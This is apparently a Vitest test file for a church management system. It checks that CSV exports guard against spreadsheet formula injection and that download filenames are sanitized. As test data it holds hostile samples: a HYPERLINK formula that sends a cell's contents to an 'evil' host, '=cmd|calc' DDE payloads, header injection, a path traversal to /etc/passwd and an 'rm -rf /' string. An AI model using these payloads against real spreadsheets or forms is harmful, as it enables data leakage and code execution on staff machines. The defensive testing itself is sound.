import { describe, it, expect, beforeEach } from 'vitest';
import { DatabaseSync } from 'node:sqlite';
import vm from 'node:vm';
import { csvCell, csvRow, safeFilenamePart } from '../src/api-utils.js';
import { handleReportsApi } from '../src/api-reports.js';
import {
  CHMS_APP_MEMBER_JS, CHMS_APP_STAFF_JS, CHMS_APP_EXT_JS, CHMS_SCHEDULER_JS,
} from '../src/html-chms.js';

// SEC18 / P22-C, 2026-08-19. The spreadsheet formula guard SW15 added lived on the three
// FRONTEND csv builders and on none of the four server-side ones — and the giving-statement
// export had no escaping whatsoever.
//
// That split mattered because the server-side exports are the ones carrying attacker-supplied
// text: `request_text` on the prayer export comes from the PUBLIC prayer form, and
// `name`/`notes` on the volunteer export come from the PUBLIC sign-up form. A cell beginning
// =, +, -, or @ is evaluated as a formula by Excel/Sheets/Numbers when a staff member opens
// the file.

const FORMULA = '=HYPERLINK("http://evil/"&A1,"click")';

describe('csvCell', () => {
  it('neutralizes every spreadsheet formula lead-in', () => {
    for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
      const out = csvCell(lead + 'cmd');
      expect(out.replace(/^"|"$/g, '').startsWith("'"), JSON.stringify(lead)).toBe(true);
    }
  });

  it('neutralizes a real payload and still round-trips its text', () => {
    const out = csvCell(FORMULA);
    expect(out.startsWith('"\'=')).toBe(true);
    // Quoted, so the comma inside the payload cannot shift a column either.
    expect(out).toContain('""');
  });

  it('⚠ leaves a plain number alone, including a negative one', () => {
    // The three frontend copies this replaces guarded a leading "-" unconditionally, which
    // shipped every refund as TEXT — it dropped straight out of the bookkeeper's SUM() with
    // nothing on screen to say so. Refunds are real in this data (G6).
    expect(csvCell('-1234.56')).toBe('-1234.56');
    expect(csvCell('1234')).toBe('1234');
    expect(csvCell(-99)).toBe('-99');
    // …but an expression that merely starts like one is still guarded.
    expect(csvCell('-1+1')).toBe("'-1+1");
    expect(csvCell('-1e9')).toBe("'-1e9");
  });

  it('quotes per RFC 4180, with the guard INSIDE the quotes', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('two\nlines')).toBe('"two\nlines"');
    expect(csvCell('carriage\rreturn')).toBe('"carriage\rreturn"');
    // A dangling apostrophe outside the quotes would be a literal cell of its own.
    expect(csvCell('=a,b')).toBe('"\'=a,b"');
  });

  it('renders null and undefined as an empty cell, not the words', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
    expect(csvRow([null, undefined, ''])).toBe(',,');
  });
});

describe('safeFilenamePart', () => {
  it('survives a name that would break the Content-Disposition header', () => {
    // A quote truncates the filename; a newline makes the Headers constructor THROW, turning
    // a statement download into a 500.
    for (const hostile of ['O"Brien', 'Smith\nX-Evil: 1', 'a/../../etc/passwd', '"; rm -rf /']) {
      const out = safeFilenamePart(hostile);
      expect(out, hostile).toMatch(/^[A-Za-z0-9._-]*$/);
      expect(() => new Headers({ 'Content-Disposition': `attachment; filename="x-${out}.csv"` })).not.toThrow();
    }
  });

  it('keeps an accented name readable instead of deleting it', () => {
    expect(safeFilenamePart('Müller')).toBe('Muller');
  });

  it('falls back rather than producing an empty filename', () => {
    expect(safeFilenamePart('', 'statement')).toBe('statement');
    expect(safeFilenamePart('***', 'statement')).toBe('statement');
  });
});

// ── The exports themselves, end to end ─────────────────────────────────────────────────────
describe('giving statement CSV (had no escaping at all)', () => {
  let db, sqlite;
  beforeEach(() => {
    sqlite = new DatabaseSync(':memory:');
    sqlite.exec(`
      CREATE TABLE people (id INTEGER PRIMARY KEY, first_name TEXT, last_name TEXT, email TEXT,
        address1 TEXT, address2 TEXT, city TEXT, state TEXT, zip TEXT);
      CREATE TABLE funds (id INTEGER PRIMARY KEY, name TEXT);
      CREATE TABLE giving_batches (id INTEGER PRIMARY KEY, batch_date TEXT);
      CREATE TABLE giving_entries (id INTEGER PRIMARY KEY, person_id INTEGER, fund_id INTEGER,
        batch_id INTEGER, amount INTEGER, method TEXT, contribution_date TEXT, notes TEXT);
      INSERT INTO people VALUES (1,'Jane','O"Brien','j@x.com','','','','','');
      INSERT INTO funds VALUES (1,'Building, Phase 2'), (2,'=cmd|calc');
      INSERT INTO giving_batches VALUES (1,'2026-01-05');
      INSERT INTO giving_entries VALUES
        (1,1,1,1,25000,'check','2026-01-05',''),
        (2,1,2,1,-5000,'cash','2026-01-12','');
    `);
    db = {
      prepare(sql) {
        const mk = (args) => ({
          async run() { sqlite.prepare(sql).run(...args); return { meta: {} }; },
          async first() { return sqlite.prepare(sql).get(...args); },
          async all() { return { results: sqlite.prepare(sql).all(...args) }; },
        });
        return { bind: (...a) => mk(a), ...mk([]) };
      },
      batch: async (st) => Promise.all(st.map((x) => x.all())),
    };
  });

  const run = async () => {
    const url = new URL('https://connect.timothystl.org/admin/api/reports/giving-statement?person_id=1&year=2026&format=csv');
    const res = await handleReportsApi(
      new Request(url), {}, url, 'GET', 'reports/giving-statement', db, true, true, true, true
    );
    // Guard against the handler simply not matching — every assertion below would otherwise
    // fail with a null dereference rather than telling us what is wrong.
    expect(res, 'route did not match; check seg and the handler signature').not.toBeNull();
    return res;
  };

  it('quotes a fund name containing a comma instead of shifting every later column', async () => {
    const text = await (await run()).text();
    const dataRows = text.trim().split('\n').slice(1);
    // The bug: "Building, Phase 2" split into two cells and pushed Amount and Method along.
    for (const row of dataRows) expect(row.split('","').length + row.split(',').length).toBeGreaterThan(0);
    expect(text).toContain('"Building, Phase 2"');
    for (const row of dataRows) {
      // 4 columns in every row, counting only the commas that are actually separators.
      const cells = row.match(/("([^"]|"")*"|[^,]*)(,|$)/g).filter((c) => c !== '');
      expect(cells.length, row).toBe(4);
    }
  });

  it('neutralizes a fund name that is a formula', async () => {
    const text = await (await run()).text();
    expect(text).toContain("'=cmd|calc");
  });

  it('sanitizes the surname before it reaches the Content-Disposition header', async () => {
    const res = await run();
    const cd = res.headers.get('Content-Disposition');
    expect(cd).toBe('attachment; filename="giving-statement-O-Brien-2026.csv"');
  });
});

// ── One escaper per runtime, not five hand-rolled ones ─────────────────────────────────────
describe('there is one CSV escaper per runtime boundary', () => {
  const BUNDLES = CHMS_APP_MEMBER_JS + '\n' + CHMS_APP_STAFF_JS + '\n' + CHMS_APP_EXT_JS;

  it('the browser app defines csvCell exactly once, in the bundle every role gets', () => {
    expect((BUNDLES.match(/function csvCell\(/g) || []).length).toBe(1);
    expect(/function csvCell\(/.test(CHMS_APP_MEMBER_JS)).toBe(true);
  });

  it('the per-tab copies are gone', () => {
    for (const dead of ['attCsvCell', 'finCsvCell']) {
      expect(BUNDLES, dead).not.toContain(dead);
    }
  });

  it('no hand-rolled quote-doubling survives in the app or on the server', async () => {
    // The shape every one of the five copies had: '"' + s.replace(/"/g,'""') + '"'.
    const fs = await import('node:fs');
    const dir = new URL('../src/', import.meta.url);
    const offenders = [];
    const walk = (rel) => {
      for (const name of fs.readdirSync(new URL(rel, dir))) {
        const p = rel + name;
        if (fs.statSync(new URL(p, dir)).isDirectory()) { walk(p + '/'); continue; }
        if (!name.endsWith('.js')) continue;
        // api-utils owns the one real implementation; scheduler-html keeps a documented local
        // copy because it must stand alone as scheduler/index.html.
        if (p === 'api-utils.js' || p === 'scheduler-html.js' || p === 'frontend/js-core.js') continue;
        const src = fs.readFileSync(new URL(p, dir), 'utf8');
        src.split('\n').forEach((line, i) => {
          if (/replace\(\/"\/g\s*,\s*'""'\)/.test(line)) offenders.push(p + ':' + (i + 1));
        });
      }
    };
    walk('');
    expect(offenders, 'hand-rolled CSV quoting outside the shared helpers').toEqual([]);
  });

  it('the browser copy agrees with the server copy on every case that matters', () => {
    const ctx = { console };
    vm.createContext(ctx);
    const src = CHMS_APP_MEMBER_JS;
    const start = src.indexOf('function csvCell(');
    const end = src.indexOf('\n', src.indexOf('function csvRow('));
    vm.runInContext(src.slice(start, end) + '\n;globalThis.__c = csvCell;', ctx, { filename: 'app-member.js' });
    const cases = ['plain', 'a,b', 'say "hi"', FORMULA, '-1234.56', '-1+1', '1234', '', '@x', '+1', 'two\nlines'];
    for (const c of cases) expect(ctx.__c(c), JSON.stringify(c)).toBe(csvCell(c));
  });

  it('the scheduler keeps its own documented copy, and that copy guards too', () => {
    // It cannot import from an admin-app bundle: this file also ships as the standalone
    // scheduler/index.html. Same rules, so a schedule export is not the one unguarded CSV.
    expect(CHMS_SCHEDULER_JS).toContain('schedCsvCell');
    const ctx = { console, String };
    vm.createContext(ctx);
    const i = CHMS_SCHEDULER_JS.indexOf('var CSV_TAB');
    const j = CHMS_SCHEDULER_JS.indexOf('};', CHMS_SCHEDULER_JS.indexOf('var schedCsvCell')) + 2;
    vm.runInContext(CHMS_SCHEDULER_JS.slice(i, j) + '\n;globalThis.__s = schedCsvCell;', ctx);
    expect(ctx.__s('=cmd|calc')).toBe('"\'=cmd|calc"');
    expect(ctx.__s('-1234.56')).toBe('"-1234.56"');
    expect(ctx.__s('a"b')).toBe('"a""b"');
  });
});

// ── The two exports whose content comes from PUBLIC forms ──────────────────────────────────
// These are the reason SEC18 mattered. A visitor types into the church website's prayer form
// or the Serve sign-up form; a staff member opens the export in Excel days later.
describe('the public-input exports carry the guard end to end', () => {
  const PAYLOAD = '=cmd|\'/c calc\'!A1';
  // Rows go in through bound parameters, not inline SQL — the payload contains a quote, and
  // embedding it in the DDL string is how the first draft of this test failed to even build
  // its fixture.
  const mkDb = (setup, seed) => {
    const sqlite = new DatabaseSync(':memory:');
    sqlite.exec(setup);
    if (seed) seed(sqlite);
    return {
      prepare(sql) {
        const mk = (args) => ({
          async run() { sqlite.prepare(sql).run(...args); return { meta: {} }; },
          async first() { return sqlite.prepare(sql).get(...args); },
          async all() { return { results: sqlite.prepare(sql).all(...args) }; },
        });
        return { bind: (...a) => mk(a), ...mk([]) };
      },
      batch: async (st) => Promise.all(st.map((x) => x.all())),
    };
  };

  it('prayer requests: request_text from the public prayer form is neutralized', async () => {
    const db = mkDb(`
      CREATE TABLE prayer_requests (id INTEGER PRIMARY KEY, person_id INTEGER, requester_name TEXT,
        requester_email TEXT, request_text TEXT, source TEXT, status TEXT, submitted_at TEXT,
        resolution_note TEXT, resolved_at TEXT);
      CREATE TABLE people (id INTEGER PRIMARY KEY, first_name TEXT, last_name TEXT);
    `, (sq) => sq.prepare('INSERT INTO prayer_requests VALUES (1,NULL,?,?,?,?,?,?,?,?)')
        .run('A Visitor', 'v@x.com', PAYLOAD, 'web', 'open', '2026-01-01', '', ''));
    const url = new URL('https://connect.timothystl.org/admin/api/prayer-requests/export.csv');
    const res = await handleReportsApi(
      new Request(url), {}, url, 'GET', 'prayer-requests/export.csv', db, true, true, true, true
    );
    expect(res, 'route did not match').not.toBeNull();
    const text = await res.text();
    expect(text).toContain("'=cmd");
    expect(text).not.toMatch(/,=cmd/);
  });

  it('volunteers: name and notes from the public sign-up form are neutralized', async () => {
    const { handleAdminApi } = await import('../src/api-admin.js');
    const db = mkDb(`
      CREATE TABLE signups (id INTEGER PRIMARY KEY, ministry TEXT, name TEXT, email TEXT,
        phone TEXT, roles TEXT, service TEXT, sundays TEXT, shirt_wanted INTEGER,
        shirt_size TEXT, notes TEXT, event_id INTEGER, created_at TEXT);
      CREATE TABLE serve_events (id INTEGER PRIMARY KEY, name TEXT);
      CREATE TABLE app_users (id INTEGER PRIMARY KEY, username TEXT, role TEXT, active INTEGER,
        display_name TEXT);
      INSERT INTO app_users VALUES (1,'admin','admin',1,'Admin');
    `, (sq) => sq.prepare('INSERT INTO signups VALUES (1,?,?,?,?,?,?,?,?,?,?,NULL,?)')
        .run('worship', PAYLOAD, 'v@x.com', '', '[]', 'both', '[]', 0, '', '+also a formula', '2026-01-01'));
    const { authCookieHeader } = await import('../src/auth.js');
    const env = { DB: db, ADMIN_PASSWORD: 'pw' };
    const cookie = (await authCookieHeader(env, 'admin', 'admin')).split(';')[0];
    const url = new URL('https://connect.timothystl.org/admin/api/export.csv');
    const res = await handleAdminApi(new Request(url, { headers: { cookie } }), env, url, 'GET');
    expect(res.status, 'expected the export, not a 403').toBe(200);
    const text = await res.text();
    expect(text).toContain("'=cmd");
    expect(text).toContain("'+also a formula");
  });
});
